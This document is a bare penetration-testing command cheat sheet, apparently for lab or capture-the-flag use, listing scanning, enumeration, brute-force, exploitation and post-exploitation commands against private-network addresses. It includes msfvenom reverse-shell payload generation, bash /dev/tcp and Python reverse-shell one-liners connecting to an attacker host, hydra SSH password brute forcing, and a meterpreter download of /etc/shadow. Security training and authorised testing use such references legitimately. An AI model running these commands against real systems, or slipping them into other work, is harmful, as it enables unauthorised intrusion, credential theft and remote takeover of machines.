# QUICK COMMAND REFERENCE

## Network Discovery
```bash
$ arp-scan -l
$ netdiscover -r 192.168.1.0/24
```

## Port Scanning
```bash
$ nmap -T4 -p- 192.168.1.100              # All ports
$ nmap -T4 -p 22,80,443 -A 192.168.1.100   # Detailed
$ nmap -sU -T4 -p 53 192.168.1.100         # UDP
```

## Web Enumeration
```bash
$ nikto -h http://192.168.1.100
$ ffuf -w wordlist.txt:FUZZ -u http://192.168.1.100/FUZZ
$ whatweb 192.168.1.100
```

## SMB
```bash
$ smbclient -L \\\\192.168.1.100
$ showmount -e 192.168.1.100               # NFS
```

## Brute Force
```bash
$ hydra -l admin -P wordlist.txt ssh://192.168.1.100:22 -t 4 -V
$ john --wordlist=rockyou.txt hashes.txt
$ hashcat -m 0 hashes.txt wordlist.txt     # MD5
```

## Exploitation
```bash
$ msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe -o shell.exe
$ nc -nvlp 4444                            # Listener
$ msfconsole
  > use exploit/...
  > set RHOSTS 192.168.1.100
  > exploit
```

## Reverse Shells
```bash
bash -i >& /dev/tcp/192.168.1.50/4444 0>&1

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.50",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

## Privilege Escalation
```bash
$ sudo -l
$ find / -perm -4000 -ls 2>/dev/null       # SUID
$ ./linpeas.sh                             # LinPEAS
```

## Post-Exploitation
```bash
$ wget http://192.168.1.50:8000/linpeas.sh
$ python3 -m http.server 8000
meterpreter> download /etc/shadow shadow
meterpreter> upload shell.sh /tmp/
```

## Hash Cracking
```bash
$ hash-identifier
$ john --wordlist=rockyou.txt hashes.txt
$ fcrackzip -v -u -D -p wordlist.txt target.zip
```

